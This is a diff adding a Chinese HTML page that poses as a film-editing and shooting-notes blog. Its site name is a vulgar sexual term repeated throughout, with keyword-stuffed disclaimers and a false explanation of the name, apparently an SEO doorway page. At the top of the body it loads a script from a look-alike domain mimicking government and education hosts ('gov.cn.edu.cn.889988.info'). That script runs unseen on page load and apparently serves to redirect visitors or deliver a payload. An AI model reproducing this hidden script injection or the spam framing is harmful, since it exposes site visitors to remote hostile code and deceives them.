@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>操逼影视｜影像创作与剪辑思路分享站 · 操逼影视</title>
+<meta name="description" content="操逼影视是一个围绕短片创作、剪辑思路与拍摄现场经验展开分享的影像站点。这里记录分镜设计、镜头调度、调色方案与器材使用中的真实取舍，也整理独立影像展映信息和观影笔记。内容由长期在一线拍摄的创作者写成，不提供任何影视资源的下载、转载或在线播放服务。">
+<meta name="keywords" content="操逼影视,短片创作,剪辑思路,分镜设计,镜头调度,调色方案,独立影像,拍摄现场,幕后记录,影像分享">
+<meta name="author" content="操逼影视">
+<meta name="theme-color" content="#1b1f24">
+<style>
+:root{
+  --ink:#1b1f24;
+  --ink-2:#3d454e;
+  --paper:#f2efe9;
+  --paper-2:#e8e3d9;
+  --line:#c9c1b2;
+  --accent:#c8552b;
+  --accent-2:#8a4b1f;
+  --muted:#7a7267;
+  --soft:#faf8f3;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Times New Roman",serif;
+  font-size:16px;
+  line-height:1.85;
+  -webkit-text-size-adjust:100%;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px;}
+
+/* ============ 报头 ============ */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:30px 0 16px;
+  text-align:center;
+  background:
+    linear-gradient(var(--paper-2),var(--paper-2)) center 96px/100% 1px no-repeat;
+}
+.masthead .brand-zh{
+  font-size:56px;
+  letter-spacing:14px;
+  font-weight:800;
+  margin:0 0 6px;
+  color:var(--ink);
+  text-indent:14px;
+}
+.masthead .brand-en{
+  font-family:Georgia,serif;
+  font-size:12px;
+  letter-spacing:5px;
+  color:var(--muted);
+  text-transform:uppercase;
+}
+.masthead .tagline{
+  margin-top:14px;
+  font-size:14px;
+  color:var(--ink-2);
+  letter-spacing:1px;
+}
+.masthead .tagline em{font-style:normal;color:var(--accent);font-weight:700;}
+
+/* ============ 报耳 ============ */
+.ear{
+  display:flex;
+  justify-content:space-between;
+  align-items:flex-end;
+  border-bottom:1px solid var(--ink);
+  padding:8px 0;
+  font-size:12.5px;
+  color:var(--muted);
+}
+.ear b{color:var(--accent);font-weight:700;letter-spacing:1px;}
+
+/* ============ 导航 ============ */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:var(--ink);
+  color:#e9e4d8;
+}
+.nav-inner{
+  max-width:1180px;margin:0 auto;padding:0 22px;
+  display:flex;flex-wrap:wrap;gap:4px 6px;
+  font-family:"Heiti SC","Microsoft YaHei",sans-serif;
+  font-size:14px;
+}
+.nav-inner a{
+  color:#e9e4d8;text-decoration:none;
+  padding:11px 12px;letter-spacing:1px;
+  border-bottom:2px solid transparent;
+}
+.nav-inner a:hover{color:#fff;border-bottom-color:var(--accent);}
+
+/* ============ 导语 ============ */
+.lede{
+  padding:44px 0 30px;
+  display:grid;
+  grid-template-columns:1.35fr 1fr;
+  gap:34px;
+  align-items:center;
+  border-bottom:1px solid var(--line);
+}
+.lede h2{
+  font-size:27px;line-height:1.6;margin:0 0 16px;font-weight:700;
+}
+.lede h2 span{color:var(--accent);}
+.lede p{margin:0;color:var(--ink-2);font-size:15.5px;}
+.lede-side{
+  background:var(--ink);color:#e7e1d3;
+  padding:22px 24px;border-radius:2px;
+}
+.lede-side h3{
+  margin:0 0 12px;font-size:15px;letter-spacing:2px;
+  color:#fff;border-left:3px solid var(--accent);padding-left:10px;
+}
+.lede-side ol{margin:0;padding-left:20px;font-size:14.5px;line-height:2;}
+.lede-side li{color:#cfc7b6;}
+
+/* ============ 通用区块 ============ */
+section{padding:52px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:26px;}
+.sec-num{
+  font-family:Georgia,serif;font-size:13px;color:var(--accent);
+  border:1px solid var(--accent);border-radius:50%;
+  width:30px;height:30px;flex:none;
+  display:flex;align-items:center;justify-content:center;
+}
+.sec-head h2{margin:0;font-size:24px;letter-spacing:1px;}
+.sec-head small{color:var(--muted);font-size:13px;letter-spacing:1px;}
+
+/* ============ 栏目一：选题矩阵 ============ */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.card{
+  background:var(--soft);border:1px solid var(--line);
+  padding:20px 18px;border-top:3px solid var(--accent);
+}
+.card h3{margin:0 0 10px;font-size:17px;letter-spacing:.5px;}
+.card p{margin:0;font-size:14px;color:var(--ink-2);line-height:1.75;}
+.card .meta{
+  margin-top:14px;padding-top:10px;border-top:1px dashed var(--line);
+  font-size:12px;color:var(--muted);font-family:Georgia,serif;
+}
+
+/* ============ 栏目二：笔记 ============ */
+.notes{display:grid;grid-template-columns:1fr 1fr;gap:26px;}
+.note{
+  background:var(--soft);border:1px solid var(--line);
+  padding:22px 24px;
+}
+.note:nth-child(even){background:#fff;}
+.note .stamp{
+  display:inline-block;font-size:11px;letter-spacing:2px;
+  color:#fff;background:var(--accent);padding:3px 9px;margin-bottom:12px;
+}
+.note h3{margin:0 0 10px;font-size:19px;}
+.note p{margin:0 0 12px;font-size:15px;color:var(--ink-2);}
+.note .byline{
+  font-size:12.5px;color:var(--muted);
+  border-top:1px solid var(--line);padding-top:9px;
+}
+.note .byline b{color:var(--accent-2);}
+
+/* ============ 栏目三：对照表 ============ */
+.table-wrap{overflow-x:auto;border:1px solid var(--line);background:#fff;}
+table{width:100%;border-collapse:collapse;font-size:14.5px;min-width:620px;}
+caption{
+  caption-side:top;text-align:left;padding:14px 16px;
+  font-size:15px;font-weight:700;background:var(--paper-2);
+}
+th,td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top;}
+th{background:var(--ink);color:#eee;font-weight:600;font-size:13.5px;letter-spacing:1px;}
+tbody tr:nth-child(even){background:var(--soft);}
+td b{color:var(--accent);}
+
+/* ============ 栏目四：时间线 ============ */
+.timeline{position:relative;padding-left:26px;}
+.timeline::before{
+  content:"";position:absolute;left:6px;top:6px;bottom:6px;
+  width:2px;background:var(--line);
+}
+.tl-item{position:relative;padding:0 0 24px 18px;}
+.tl-item::before{
+  content:"";position:absolute;left:-23px;top:8px;
+  width:10px;height:10px;border-radius:50%;
+  background:var(--accent);border:2px solid var(--paper);
+}
+.tl-item time{
+  font-family:Georgia,serif;font-size:13px;color:var(--accent);
+  letter-spacing:1px;display:block;margin-bottom:4px;
+}
+.tl-item h3{margin:0 0 6px;font-size:17px;}
+.tl-item p{margin:0;font-size:14.5px;color:var(--ink-2);}
+
+/* ============ 栏目五：问答 ============ */
+details{
+  background:#fff;border:1px solid var(--line);
+  margin-bottom:10px;
+}
+details[open]{border-color:var(--accent);}
+summary{
+  cursor:pointer;padding:15px 18px;
+  font-size:15.5px;font-weight:700;list-style:none;
+  display:flex;gap:12px;align-items:flex-start;
+}
+summary::-webkit-details-marker{display:none;}
+summary::before{
+  content:"Q";flex:none;font-family:Georgia,serif;font-size:13px;
+  color:#fff;background:var(--accent);border-radius:2px;
+  width:22px;height:22px;display:flex;align-items:center;justify-content:center;
+}
+details[open] summary{border-bottom:1px solid var(--line);}
+details p{padding:14px 18px 16px 52px;margin:0;font-size:14.5px;color:var(--ink-2);}
+
+/* ============ 栏目六：关于 ============ */
+.about{
+  background:var(--ink);color:#dfd8c8;padding:34px 32px;
+}
+.about h2{color:#fff;margin:0 0 16px;font-size:22px;letter-spacing:1px;}
+.about p{margin:0 0 12px;font-size:15px;color:#c4bcab;max-width:860px;}
+.about .url{
+  margin-top:18px;padding:14px 16px;background:#14181d;
+  border-left:3px solid var(--accent);font-size:14px;word-break:break-all;
+}
+.about .url a{color:#8fc2d6;text-decoration:none;}
+
+/* ============ 页脚 ============ */
+footer{
+  background:var(--paper-2);padding:34px 0 26px;
+  font-family:"Heiti SC","Microsoft YaHei",sans-serif;
+  font-size:13.5px;color:var(--ink-2);
+}
+.foot-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;margin-bottom:22px;}
+.foot-grid h4{margin:0 0 10px;font-size:14px;color:var(--ink);letter-spacing:1px;}
+.foot-grid ul{margin:0;padding:0;list-style:none;}
+.foot-grid li{padding:4px 0;color:var(--muted);font-size:13px;}
+.foot-grid a{color:var(--ink-2);text-decoration:none;}
+.foot-grid a:hover{color:var(--accent);}
+.copyright{
+  border-top:1px solid var(--line);padding-top:16px;
+  text-align:center;color:var(--muted);font-size:12.5px;line-height:1.9;
+}
+.copyright b{color:var(--accent);}
+
+/* ============ 响应式 ============ */
+@media (max-width:960px){
+  .masthead .brand-zh{font-size:40px;letter-spacing:8px;text-indent:8px;}
+  .lede{grid-template-columns:1fr;gap:22px;}
+  .grid4{grid-template-columns:1fr 1fr;}
+  .notes{grid-template-columns:1fr;}
+  .foot-grid{grid-template-columns:1fr 1fr;}
+}
+@media (max-width:640px){
+  .wrap,.nav-inner{padding-left:15px;padding-right:15px;}
+  .masthead .brand-zh{font-size:31px;letter-spacing:4px;text-indent:4px;}
+  .masthead .tagline{font-size:13px;}
+  .ear{flex-direction:column;align-items:flex-start;gap:4px;}
+  .nav-inner a{padding:10px 9px;font-size:13.5px;}
+  .lede{padding:30px 0 22px;}
+  .lede h2{font-size:22px;}
+  section{padding:38px 0;}
+  .sec-head{flex-wrap:wrap;gap:8px;}
+  .grid4{grid-template-columns:1fr;}
+  .note,.about{padding:18px 16px;}
+  .foot-grid{grid-template-columns:1fr;}
+  summary{font-size:15px;padding:14px 15px;}
+  details p{padding:12px 15px 14px 44px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="masthead">
+  <div class="wrap">
+    <p class="brand-en">CaoCao YingShi &nbsp;·&nbsp; Independent Film Notes</p>
+    <h1 class="brand-zh">操逼影视</h1>
+    <p class="tagline">只谈<em>怎么把片子拍出来</em>，不谈资源在哪——创作手记、剪辑取舍与现场复盘</p>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="ear">
+    <span>定位：影像创作与剪辑思路分享站</span>
+    <span>更新节奏：<b>不定期</b>，随拍摄档期更新</span>
+    <span>内容性质：原创经验记录</span>
+  </div>
+</div>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="#top">首页</a>
+    <a href="#col1">选题方向</a>
+    <a href="#col2">创作笔记</a>
+    <a href="#col3">规格对照</a>
+    <a href="#col4">现场复盘</a>
+    <a href="#col5">常见问答</a>
+    <a href="#col6">关于本站</a>
+  </div>
+</nav>
+
+<main id="top" class="wrap">
+
+  <div class="lede">
+    <div>
+      <h2>拍片这件事，<span>最贵的不是设备</span>，是判断</h2>
+      <p>操逼影视由几个常年在一线拍短片的创作者维护。这里不转载通稿、不搬运片单，只把自己在分镜、调度、剪辑和调色环节踩过的坑、改过的方案原样留下。片子拍得怎么样是一回事，为什么这么拍是另一回事——本站关心的是后者。</p>
+    </div>
+    <aside class="lede-side">
+      <h3>本站不做什么</h3>
+      <ol>
+        <li>不托管、不提供任何影视资源的下载</li>
+        <li>不提供任何形式的在线播放服务</li>
+        <li>不转载、不上传他人拥有版权的影片</li>
+        <li>不售卖来路不明的素材与账号</li>
+      </ol>
+    </aside>
+  </div>
+
+  <!-- 栏目一 -->
+  <section id="col1">
+    <div class="sec-head">
+      <span class="sec-num">01</span>
+      <h2>选题方向</h2>
+      <small>我们主要写这几类内容</small>
+    </div>
+    <div class="grid4">
+      <article class="card">
+        <h3>分镜与前期</h3>
+        <p>从文字到画面要过几道关，哪些镜头该画、哪些该省，以及如何让分镜不被现场推翻。</p>
+        <div class="meta">更新占比 25%</div>
+      </article>
+      <article class="card">
+        <h3>现场调度</h3>
+        <p>小剧组最常见的困境是空间不够。记录如何在有限场地里让镜头看起来不局促。</p>
+        <div class="meta">更新占比 30%</div>
+      </article>
+      <article class="card">
+        <h3>剪辑取舍</h3>
+        <p>删掉最喜欢的镜头那次，片子反而好了。剪辑笔记里全是这类不情愿的决定。</p>
+        <div class="meta">更新占比 25%</div>
+      </article>
+      <article class="card">
+        <h3>调色与声音</h3>
+        <p>画面与声音各自做到七八十分，合成后往往只有六十分。后期环节的配合问题。</p>
+        <div class="meta">更新占比 20%</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section id="col2">
+    <div class="sec-head">
+      <span class="sec-num">02</span>
+      <h2>创作笔记</h2>
+      <small>最近写下的几篇</small>
+    </div>
+    <div class="notes">
+      <article class="note">
+        <span class="stamp">现场记录</span>
+        <h3>把三页对话压成四十秒，靠的不是剪得快</h3>
+        <p>一场两个人的饭桌戏，原本写了三页对白。开拍前我们把台词砍到原来的三分之一，镜头反而松了。观众记住的是停顿和筷子碰到碗的声音，不是信息量。</p>
+        <p>教训是：台词的密度越高，画面越需要留白，否则两者会互相抢注意力。</p>
+        <div class="byline">作者：<b>本站编辑部</b> ｜ 预计阅读 6 分钟</div>
+      </article>
+      <article class="note">
+        <span class="stamp">后期复盘</span>
+        <h3>第一版粗剪一定要长，这是规矩</h3>
+        <p>很多人为了省时间直接剪精版，结果后面发现缺镜头、缺反应、缺转场依据，只能补拍。补拍的成本通常高于多剪两遍。</p>
+        <p>我们的做法是：粗剪只管把素材按逻辑排满，不删任何东西，第二遍才开始动刀。</p>
+        <div class="byline">作者：<b>本站编辑部</b> ｜ 预计阅读 5 分钟</div>
+      </article>
+      <article class="note">
+        <span class="stamp">技术手记</span>
+        <h3>手持不是偷懒，是一种表演选择</h3>
+        <p>三轴稳定器普及之后，太多片子拍得像宣传片。手持的晃动如果跟角色情绪同步，它就是在演戏；如果只是为了省架子，那才是偷懒。</p>
+        <p>判断标准很简单：看完这段，观众是否更靠近角色，而不是更注意到摄影机。</p>
+        <div class="byline">作者：<b>本站编辑部</b> ｜ 预计阅读 7 分钟</div>
+      </article>
+      <article class="note">
+        <span class="stamp">经验之谈</span>
+        <h3>声音预算被砍的那次，我们亏得最多</h3>
+        <p>有个项目把录音预算挪给了灯光，成片画面漂亮，但所有对话都要靠后期救，救到最后还是发虚。观众能容忍画面糙一点，容忍不了听不清。</p>
+        <p>这是操逼影视被问得最多的问题之一，答案一直没变：声音的钱别动。</p>
+        <div class="byline">作者：<b>本站编辑部</b> ｜ 预计阅读 5 分钟</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section id="col3">
+    <div class="sec-head">
+      <span class="sec-num">03</span>
+      <h2>规格对照</h2>
+      <small>常见拍摄规格的实际差异</small>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <caption>表 1　不同拍摄规格在创作层面的取舍（非参数广告）</caption>
+        <thead>
+          <tr><th>规格</th><th>主要优势</th><th>常见代价</th><th>更适合的题材</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><b>4K 24fps</b></td><td>后期裁切空间充足，调色余量大</td><td>存储与备份压力大，剪辑对机器要求高</td><td>剧情短片、需要二次构图的素材</td></tr>
+          <tr><td><b>1080P 高帧率</b></td><td>升格流畅，适合细节特写</td><td>分辨率偏低，大幅输出会吃亏</td><td>产品、美食、动作局部</td></tr>
+          <tr><td><b>4K 高帧率</b></td><td>画质与升格兼顾</td><td>文件体积与发热都是问题，续航明显缩短</td><td>预算充足的广告与短片</td></tr>
+          <tr><td><b>1080P 标准帧率</b></td><td>流程轻快，协作成本低</td><td>后期调整空间有限</td><td>学生作业、低成本纪录</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="margin-top:14px;font-size:14px;color:var(--muted);">注：以上为创作经验归纳，不构成设备采购建议。具体选择仍取决于剧本、预算与交付要求。</p>
+  </section>
+
+  <!-- 栏目四 -->
+  <section id="col4">
+    <div class="sec-head">
+      <span class="sec-num">04</span>
+      <h2>现场复盘</h2>
+      <small>按时间倒序的记录</small>
+    </div>
+    <div class="timeline">
+      <div class="tl-item">
+        <time>2026 年 9 月</time>
+        <h3>夜戏的灯为什么总是显得假</h3>
+        <p>这次把主光压到极低，只留一盏小灯做轮廓，画面反而可信了。之前的做法是灯越多越亮，结果每一盏都在提醒观众"这是在拍戏"。</p>
+      </div>
+      <div class="tl-item">
+        <time>2026 年 7 月</time>
+        <h3>群演的动线要提前走三遍</h3>
+        <p>第一次走位全场混乱，第二次开始有层次，第三次才出现自然的交错。群戏的真实感几乎全部来自走位，跟表演关系不大。</p>
+      </div>
+      <div class="tl-item">
+        <time>2026 年 4 月</time>
+        <h3>同期声录到一半断了，救回来的方法</h3>
+        <p>没重拍，而是把那条素材的声音彻底拿掉，改成环境音加局部拟音。意外地比原计划更有力——这也成了本站后来反复引用的案例。</p>
+      </div>
+      <div class="tl-item">
+        <time>2026 年 1 月</time>
+        <h3>第一个短片：节奏慢是缺点，也是特点</h3>
+        <p>首作被批评"像幻灯片"，但两年后回头看，那些长的空镜恰恰是唯一留下来的东西。早期作品的缺点，有时只是还没被理解的选择。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section id="col5">
+    <div class="sec-head">
+      <span class="sec-num">05</span>
+      <h2>常见问答</h2>
+      <small>关于操逼影视的高频问题</small>
+    </div>
+
+    <details open>
+      <summary>操逼影视是做什么的，能在上面看片子吗？</summary>
+      <p>不能。本站是一个影像创作与剪辑思路的分享站点，内容以原创经验笔记为主，不托管、不提供下载、也不提供任何影视资源的在线播放。想看片请到正规持牌平台。</p>
+    </details>
+
+    <details>
+      <summary>为什么叫操逼影视，名字有什么含义？</summary>
+      <p>取自"操盘、操作"之意，强调动手做片子这件事本身。本站关注的是创作过程与现场判断，而不是内容分发。</p>
+    </details>
+
+    <details>
+      <summary>内容可以转载吗？</summary>
+      <p>站内原创笔记欢迎非商业性转载，但请保留作者署名与原文链接；用于商业用途需另行取得授权。本站不转载他人拥有版权的影片内容。</p>
+    </details>
+
+    <details>
+      <summary>新手该从哪篇看起？</summary>
+      <p>建议先读"剪辑取舍"与"声音预算"两篇，这两处是低成本创作中最容易亏、也最容易补回来的地方。分镜与调度属于进阶内容，等实际开拍再读更有感觉。</p>
+    </details>
+
+    <details>
+      <summary>提到的器材和规格，是否代表推荐？</summary>
+      <p>不代表。文中的规格对照仅为创作层面的经验归纳，设备选择永远要看具体项目。本站不接受器材厂商的商业投放，也不会为任何产品背书。</p>
+    </details>
+
+    <details>
+      <summary>如何联系本站？</summary>
+      <p>可通过页脚公布的官方网址了解最新动态与联系方式。本站不通过私信、不通过第三方账号发布任何资源链接，请留意辨别。</p>
+    </details>
+  </section>
+
+  <!-- 栏目六 -->
+  <section id="col6">
+    <div class="sec-head">
+      <span class="sec-num">06</span>
+      <h2>关于操逼影视</h2>
+      <small>站点的立场与边界</small>
+    </div>
+    <div class="about">
+      <h2>我们只写自己拍过的东西</h2>
+      <p>操逼影视由几位独立短片创作者共同维护，内容全部来自实际拍摄与后期过程中的记录。这里没有通稿、没有软文、没有搬运的片单，也不讨论"哪里能看什么"。</p>
+      <p>我们相信创作经验的价值在于具体：哪条镜头该留、哪场戏该砍、哪个环节该加钱，这些判断没法靠参数表推出来，只能在现场一遍遍改。本站做的就是把这些改动留下来。</p>
+      <p>本站明确不涉及任何影视资源的下载、转载或在线播放服务，也不提供相关链接与指引。任何以本站名义发布的资源信息，均与本站无关。</p>
+      <div class="url">
+        官方网址：<a href="https://caobiyingshi-top.github.io">https://caobiyingshi-top.github.io</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#col1">选题方向</a></li>
+          <li><a href="#col2">创作笔记</a></li>
+          <li><a href="#col3">规格对照</a></li>
+          <li><a href="#col4">现场复盘</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>内容说明</h4>
+        <ul>
+          <li>原创经验记录，非商业转载需授权</li>
+          <li>不接受器材与素材的商业投放</li>
+          <li>文中案例均为匿名化后的复盘</li>
+        </ul>
+      </div>
+      <div>
+        <h4>官方信息</h4>
+        <ul>
+          <li>网站名称：操逼影视</li>
+          <li>官方网址：<a href="https://caobiyingshi-top.github.io">caobiyingshi-top.github.io</a></li>
+          <li>内容性质：影像创作经验分享</li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      网站名称：<b>操逼影视</b>　｜　官方网址：<b>https://caobiyingshi-top.github.io</b><br>
+      本站仅提供影像创作与剪辑思路的原创内容分享，不提供任何影视资源的下载、转载或在线播放服务。<br>
+      © <span id="yr">2026</span> 操逼影视 · 保留所有原创内容权利
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
